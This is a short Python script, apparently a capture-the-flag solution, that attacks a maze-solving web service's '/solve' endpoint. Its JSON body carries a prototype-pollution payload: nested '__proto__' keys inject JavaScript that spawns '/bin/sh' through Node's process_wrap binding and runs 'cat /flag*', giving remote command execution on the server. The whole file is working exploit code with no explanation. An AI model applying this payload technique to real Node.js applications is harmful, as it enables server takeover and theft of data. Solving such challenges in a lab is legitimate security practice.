import requests
import json
import os

HOST = os.getenv("HOST", "0.0.0.0")
PORT = os.getenv("PORT", "14002")

js = """
var p = process.binding('process_wrap').Process;
var proc = new p();
proc.spawn({
  file: '/bin/sh',
  args: ['/bin/sh', '-c', '/bin/cat /flag*'],
  cwd: '/',
  stdio: [process.stdin, process.stdout, process.stderr]
});
""".replace("\n", "")

maze = {
    "map": [[0, 0], [0, 0]],
    "start": {
        "0": 0, "1": 0,
        "__proto__": {
            "__proto__": {
                "heap": "BinaryHeap(), function(){" + js + "}();//"
            }
        }
    },
    "goal": (1, 1),
    "heap": None
}

r = requests.post(f"http://{HOST}:{PORT}/solve",
                  headers = {"Content-Type": "application/json"},
                  data = json.dumps(maze))
print(r.text)
